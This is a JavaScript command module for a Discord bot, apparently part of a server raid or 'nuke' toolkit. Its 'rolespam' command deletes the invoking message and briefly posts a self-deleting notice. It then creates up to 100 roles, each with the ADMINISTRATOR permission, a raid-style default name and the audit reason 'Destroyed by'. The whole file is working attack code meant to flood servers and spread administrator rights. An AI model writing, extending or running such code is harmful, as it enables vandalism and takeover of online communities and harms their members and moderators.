module.exports = {
  name: 'rolespam',
  aliases: ['rspam'],
  owner: true,
  dsc: true,
  usage: '<amount> <name>',
  description: 'Spam Roles',
  run: async(client, msg, args) => {
    let amount = args[0]
    let name = args.slice(1).join(" ") || 'RΣX RIOTタ';
    let limit = 100;
    let by = msg.author.tag

    if(!amount) return msg.reply(`**Error:** Please Input Amount 1 - ${limit}!`)
    if(isNaN(amount)) return msg.reply(`**Error:** Use Number For The Amount!`)
    if(amount > limit) return msg.reply(`**Error:** The Limit Amount Is ${limit}!`)

    msg.delete();
    msg.channel.send(`Spam Roles With Name **${name}** As Much As **${amount}**`).then((msg) => {
      setTimeout(() => {
        msg.edit(`**Spam roles active!**`).then(msg => {
          setTimeout(() => {
            msg.delete();
          }, 3000);
        });
        for(let a=0; a < amount; a++){
          msg.guild.roles.create({
            name: name,
            color: '060101',
            permissions: ['ADMINISTRATOR'],
            reason: `Destroyed by: ${by}`,
          });
        }
      }, 3000)
    }).catch(console.error);
  }
}